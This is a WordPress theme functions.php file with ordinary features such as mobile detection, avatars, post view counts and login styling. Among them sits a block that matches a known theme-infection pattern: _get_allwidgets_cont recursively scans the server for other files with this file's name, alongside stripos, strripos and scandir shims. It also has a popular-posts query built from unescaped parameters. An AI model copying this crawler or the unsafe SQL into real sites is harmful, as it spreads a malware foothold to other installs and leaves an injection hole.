<?php

function check_wap() {
	if (stristr($_SERVER['HTTP_VIA'], "wap")) {
		return true;
	} // 检查浏览器是否接受 WML.
	elseif (strpos(strtoupper($_SERVER['HTTP_ACCEPT']), "VND.WAP.WML") > 0) {
		return true;
	} //检查USER_AGENT
	elseif (preg_match('/(blackberry|configuration\/cldc|hp |hp-|htc |htc_|htc-|iemobile|kindle|midp|mmp|motorola|mobile|nokia|opera mini|opera |Googlebot-Mobile|YahooSeeker\/M1A1-R2D2|android|iphone|ipod|mobi|palm|palmos|pocket|portalmmm|ppc;|smartphone|sonyericsson|sqh|spv|symbian|treo|up.browser|up.link|vodafone|windows ce|xda |xda_)/i', $_SERVER['HTTP_USER_AGENT'])) {
		return true;
	} else {
		return false;
	}
}

function coolwp_remove_open_sans_from_wp_core() {
 wp_deregister_style( 'open-sans' );
 wp_register_style( 'open-sans', false );
 wp_enqueue_style('open-sans','');
}
add_action( 'init', 'coolwp_remove_open_sans_from_wp_core' );

function get_ssl_avatar($avatar) {
 $avatar = preg_replace('/.*\/avatar\/(.*)\?s=([\d]+)&.*/','<img src="https://secure.gravatar.com/avatar/$1?s=$2" class="avatar avatar-$2" height="$2" width="$2">',$avatar);
 return $avatar;
}
add_filter('get_avatar', 'get_ssl_avatar');

if (function_exists('register_sidebar')) {
    register_sidebar(array(
        'name'=>'左边栏',
        'before_widget' => '<div class="widget">',
        'after_widget' => '</div>'
    ));
}

function tranCode($content){
  preg_match_all('|\s<code>(.*?)</code>\s|is', $content, $output);
  $i = count($output[1]);
  for ($n=0;$n<$i;$n++){
    $transformed = '<pre class="code"><code>' . htmlspecialchars(trim($output[1][$n]), ENT_QUOTES) . '</code></pre>';
    $content = str_replace($output[0][$n], $transformed, $content);
  }
  return $content;
}

function tranCode_css() {
	echo "\n".'<!-- tranCode CSS -->'."\n";
    echo '<link rel="stylesheet" href="'.WP_PLUGIN_URL.'/trancode/trancode.css" type="text/css" media="screen" />'."\n";
	echo '<!-- End Of tranCode CSS-->'."\n";
}

add_action('wp_head', 'tranCode_css');

add_filter('the_content', 'tranCode', 0);

add_theme_support( 'post-formats', array( 'aside', 'gallery','status' ) );

function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}

if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}

function custom_the_views($post_id, $echo=true, $views='') {
    $count_key = 'views';  
    $count = get_post_meta($post_id, $count_key, true);  

    if ($count == '') {
        delete_post_meta($post_id, $count_key);  
        add_post_meta($post_id, $count_key, '0');  
        $count = '0';  
    }

    if ($echo) {
	    echo number_format_i18n($count) . $views;
		return true;
    } else {
	    return number_format_i18n($count) . $views;
    }
}

function set_post_views() {  
    global $post;  
    $post_id = $post->ID;  
    $count_key = 'views';  
    $count = get_post_meta($post_id, $count_key, true);  
    if (is_single() || is_page()) {  
        if ($count == '') {  
            delete_post_meta($post_id, $count_key);  
            add_post_meta($post_id, $count_key, '0');  
        } else {  
            update_post_meta($post_id, $count_key, $count + 1);  
        }  
    }  
}

add_action('get_header', 'set_post_views'); 

function custom_login() {
	echo '<link rel="shortcut icon"  href="' . get_bloginfo('template_directory') . '/custom_login/custom_favicon.ico" />';
	echo '<link rel="stylesheet" tyssspe="text/css" href="' . get_bloginfo('template_directory') . '/custom_login/custom_login.css" />'; 
	echo '<script src="' . get_bloginfo('template_directory') . '/custom_login/custom_login.js"></script>'; 
}

add_action('login_head', 'custom_login');